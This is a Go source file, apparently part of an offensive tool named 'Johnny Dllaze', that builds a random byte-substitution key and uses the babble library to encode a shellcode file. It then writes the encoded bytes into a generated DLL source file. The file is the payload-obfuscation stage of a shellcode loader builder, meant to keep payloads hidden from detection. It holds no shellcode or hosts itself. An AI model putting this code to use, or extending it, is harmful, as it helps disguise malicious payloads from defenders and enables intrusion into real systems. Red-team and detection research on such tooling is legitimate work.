package main

import (
	"fmt"
	"log"
	"math"
	"math/rand/v2"
	"os"
	"path/filepath"
	"strings"

	"github.com/mjwhitta/babble"
)

func byteMap(fn string) error {
	var (
		b []byte
		e error
	)

	for i := range math.MaxUint8 + 1 {
		b = append(b, byte(i))
	}

	rand.Shuffle(
		math.MaxUint8+1,
		func(i int, j int) {
			var tmp byte = b[i]

			b[i] = b[j]
			b[j] = tmp
		},
	)

	//nolint:mnd // u=rw,go=-
	if e = os.WriteFile(fn, b, 0o600); e != nil {
		return e
	}
	return nil
}

func scObfuscator(scFile string) error {
	var (
		dllpayloadfilename = filepath.Join("dll", "payload_generated.go")
		e                  error
		enc_bytes          []byte
		footer             = "-----END BABBLE-----"
		header             = "-----BEGIN BABBLE-----"
		k                  *babble.Key
		keyFile            = filepath.Join("dll", "key_generated.bin")
	)

	log.Println("[+] Generating key file...")
	e = byteMap(keyFile)
	checkError(e)

	log.Println("[+] Obfuscating shellcode...")
	k, e = babble.NewKeyFromFile(keyFile, &babble.ByteMode{})
	checkError(e)

	enc_bytes, e = babble.EncryptFile(scFile, k)
	checkError(e)
	enc_bytes = enc_bytes[len(header) : len(enc_bytes)-len(footer)]

	log.Println("[+] Writing payload to DLL source...")
	var buf strings.Builder
	buf.WriteString("// Code generated by Johnny Dllaze; DO NOT EDIT.\n")
	buf.WriteString("package main\n\n")
	buf.WriteString("var buf = []byte { ")
	for i := 0; i < len(enc_bytes); i++ {
		buf.WriteString(fmt.Sprintf("%v", enc_bytes[i]))
		if i != len(enc_bytes)-1 {
			buf.WriteString(", ")
		}
	}
	buf.WriteString(" }\n\n")

	e = os.WriteFile(dllpayloadfilename, []byte(buf.String()), 0o600)
	checkError(e)
	return nil
}
